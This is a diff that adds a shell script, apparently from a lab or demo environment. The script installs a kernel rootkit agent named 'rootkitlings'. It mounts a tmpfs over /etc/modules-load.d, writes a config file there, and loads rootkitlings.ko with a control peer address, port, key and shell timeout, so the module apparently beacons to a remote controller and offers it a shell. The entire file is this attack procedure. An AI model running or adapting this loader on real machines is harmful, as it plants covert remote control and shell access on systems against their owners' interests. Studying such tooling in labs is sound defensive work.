@@ -1,0 +1,52 @@
+#!/bin/sh
+
+set -eu
+
+# shellcheck source=scripts/lib/ui.sh
+. /vm/ui.sh
+
+profile=${1:-}
+key=${2:-}
+peer=${3:-}
+control_port=${4:-}
+shell_port=${5:-}
+
+show()
+{
+	ui_transcript "$*"
+}
+
+run()
+{
+	show "$@"
+	"$@"
+}
+
+if test "$profile" != authenticated-agent; then
+	ui_die "Unknown play profile: $profile"
+fi
+
+ui_heading 'Completed authenticated agent'
+ui_field 'Control peer' "$peer:$control_port"
+ui_field 'Shell peer' "$peer:$shell_port"
+
+run mkdir -p /etc/modules-load.d
+run mount -t tmpfs -o nosuid,nodev,noexec,mode=0700 tmpfs \
+	/etc/modules-load.d
+run chmod 0700 /etc/modules-load.d
+show "printf 'operator-original\\n' > /etc/modules-load.d/rootkitlings.conf"
+printf 'operator-original\n' > /etc/modules-load.d/rootkitlings.conf
+run chmod 0600 /etc/modules-load.d/rootkitlings.conf
+command='insmod /rootkitlings/rootkitlings.ko'
+command="$command peer_address=$peer peer_port=$control_port"
+command="$command retry_base_ms=25 retry_max_ms=200"
+command="$command control_key=<redacted> shell_timeout_ms=300000"
+show "$command"
+insmod /rootkitlings/rootkitlings.ko \
+	"peer_address=$peer" \
+	"peer_port=$control_port" \
+	retry_base_ms=25 \
+	retry_max_ms=200 \
+	"control_key=$key" \
+	shell_timeout_ms=300000
+run cat /proc/rootkitlings_agent
